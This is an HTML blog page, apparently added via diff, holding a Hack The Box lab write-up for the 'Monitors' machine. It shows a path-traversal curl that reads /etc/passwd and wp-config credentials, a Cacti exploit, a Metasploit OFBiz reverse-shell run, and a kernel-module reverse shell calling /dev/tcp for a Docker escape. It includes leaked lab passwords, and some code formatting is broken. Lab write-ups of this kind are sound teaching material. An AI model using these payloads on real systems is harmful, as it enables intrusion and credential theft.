@@ -1,0 +1,731 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.18.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Monitors - EntrophyBlog</title>
+<meta name="description" content="User ">
+
+
+  <meta name="author" content="Entrophy">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="EntrophyBlog">
+<meta property="og:title" content="Monitors">
+<meta property="og:url" content="/htb/monitors/">
+
+
+  <meta property="og:description" content="User ">
+
+
+
+  <meta property="og:image" content="/assets/images/bio-photo.jpg">
+
+
+
+  <meta name="twitter:site" content="@mmistakes">
+  <meta name="twitter:title" content="Monitors">
+  <meta name="twitter:description" content="User ">
+  <meta name="twitter:url" content="/htb/monitors/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="/assets/images/bio-photo.jpg">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-05-13T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="/htb/monitors/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Your Name",
+      "url": "/",
+      "sameAs": ["https://twitter.com/","https://github.com/"]
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="EntrophyBlog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/logo.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          There must be a title?
+          <span class="site-subtitle">Just Another Blog</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/aboutMe/" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >HTB WriteUps</a>
+            </li><li class="masthead__menu-item">
+              <a href="/collection-archive/" >Posts</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/entrophy.jpg" alt="Entrophy" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Entrophy</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>I am</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/Entrophy6" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/3ntr0phy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+          
+            <li><a href="https://instagram.com/__3ntr0py__" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram</a></li>
+          
+        
+          
+            <li><a href="https://app.hackthebox.eu/profile/9548" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-list" aria-hidden="true"></i> HackTheBox</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Monitors">
+    <meta itemprop="description" content="User">
+    <meta itemprop="datePublished" content="2021-05-13T00:00:00+01:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Monitors
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  3 minute read
+
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <h1 id="user">User</h1>
+
+<p>The first thing is to use nmap for scan ports :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sSCV -v -A -p- -Pn 10.10.10.238
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 23:41 CDT
+Nmap scan report for 10.10.10.238
+Host is up (0.23s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
+|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
+|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.76 seconds
+
+
+</code></pre></div></div>
+
+<p>As always add <code class="language-plaintext highlighter-rouge">monitors.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and we get the following webpage.</p>
+
+<p><img src="//assets/images/monitor/1.png" alt="" /></p>
+
+<p>It is powered by wordpress so just try <code class="language-plaintext highlighter-rouge">wpscan</code> out</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan --url http://monitors.htb/ -e ap,cb,dbe
+
+....
+
+[+] wp-with-spritz
+ | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/
+ | Latest Version: 1.0 (up to date)
+ | Last Updated: 2015-08-20T20:15:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 4.2.4 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt
+
+...
+
+</code></pre></div></div>
+
+<p>It seems that there is a vulnerability - https://www.exploit-db.com/exploits/44544 :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd 
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
+Debian-snmp:x:112:115::/var/lib/snmp:/bin/false
+mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false
+
+
+</code></pre></div></div>
+
+<p>Try to get wordpress config under <code class="language-plaintext highlighter-rouge">/var/www/wordpress/wp-config.php</code> :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//var/www/wordpress/wp-config.php
+
+...
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'wpadmin' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+
+...
+
+</code></pre></div></div>
+
+<p>Unfortunately the password does not work, try to gather some extra information:</p>
+
+<p><img src="//assets/images/monitor/2.png" alt="" /></p>
+
+<p>a new vhost appeared <code class="language-plaintext highlighter-rouge">cacti.monitors.htb</code>! Add it to the <code class="language-plaintext highlighter-rouge">hosts</code> file and visit the website.</p>
+
+<p>Use the wordpress credentials for login and we are in. The framework is version 1.2.12 –&gt; https://www.exploit-db.com/exploits/49810. 
+I had to do it manually via burp :</p>
+
+<p>Step  1:</p>
+<pre><code class="language-/cacti/color.php">
+Step 2:
+```/cacti/host.php?action=reindex```
+
+and I obtained a reverse shell as `www-data`
+
+
+Enumerating the system I found an interesting service called `cacti-backup.service` which points at `/home/marcus/.backup/backup.sh`. Just reading the content in order to obtain marcus ssh password!
+
+`VerticalEdge2020`
+
+# Root
+
+Running enumeration on the host it is possible to see a new port running locally, `8443`.
+So we do pivoting through ssh using `ssh -L 8443:localhost:8443 marcus@monitors.htb`
+
+![](//assets/images/monitor/3.png)
+
+As we see the server runs tomcat version 9.0.31. After some research, I discovered that Tomcat is now part of Apache OfBiz, so I checked some vulnerabilities for also that framework and found `CVE-2020-9496`.
+
+
+
+`use exploit/linux/http/apache_ofbiz_deserialization
+set LHOST 10.10.x.x
+set RHOSTS 127.0.0.1
+set payload linux/x64/shell/reverse_tcp
+set forceexploit true
+run
+`
+
+and we got shell as root into the docker container (there is `.dockernev` ) . So now we need to evade the docker somehow.
+Checking the capabilities with linpeas we can notice that we have  `CAP_SYS_MODULE` which is really interesting. I followed different articles ( https://xcellerator.github.io/posts/docker_escape/, https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd) which mainly prove that, due to the fact that the kernel for the container is the same as the host, we can evade the container installing a module which interacts directly with the kernel.
+
+So I just created two files, `Makefile` and `reverse.c` :
+
+</code></pre>
+<p>Makefile</p>
+
+<p>obj-m +=reverse.o
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+
+</code></pre></div></div>
+<p>reverse.c</p>
+
+<p>#include &lt;linux/kmod.h&gt;
+#include &lt;linux/module.h&gt;
+MODULE_LICENSE(“GPL”);
+MODULE_AUTHOR(“AttackDefense”);
+MODULE_DESCRIPTION(“LKM reverse shell module”);
+MODULE_VERSION(“1.0”);
+char* argv[] = {“/bin/bash”,”-c”,”bash -i &gt;&amp; /dev/tcp/172.17.0.1/4444 0&gt;&amp;1”, NULL};
+static char* envp[] = {“PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin”, NULL };
+static int __init reverse_shell_init(void) {
+return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+static void __exit reverse_shell_exit(void) {
+printk(KERN_INFO “Exiting\n”);
+}
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);</p>
+
+<p>```</p>
+
+<p>After having uploaded them onto the docker container, using <code class="language-plaintext highlighter-rouge">curl -o</code>,  compile them through <code class="language-plaintext highlighter-rouge">make all</code> command (if you encounter compilation problems and errors just run <code class="language-plaintext highlighter-rouge">export PATH=$PATH/usr/lib/gcc/x86_64-linux-gnu/8/</code>) and then open a netcat listener on the host as marcus</p>
+
+<p><code class="language-plaintext highlighter-rouge">nc -lnvp 4444</code></p>
+
+<p>At last run <code class="language-plaintext highlighter-rouge">insmod reverse.ko</code>. And we obtain a reverse shell back as root. Enjoy!</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#htb" class="page__taxonomy-item" rel="tag">HTB</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-05-13T00:00:00+01:00">May 13, 2021</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?via=mmistakes&text=Monitors%20%2Fhtb%2Fmonitors%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=%2Fhtb%2Fmonitors%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=%2Fhtb%2Fmonitors%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb/ghoul/" class="pagination--pager" title="Ghoul
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/htb/ghoul/" rel="permalink">Ghoul
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  10 minute read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">USER
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/htb/bastion/" rel="permalink">Bastion
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  4 minute read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">USER
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+      
+        
+          <li><a href="https://twitter.com/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://github.com/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://instagram.com/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram</a></li>
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 Your Name. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
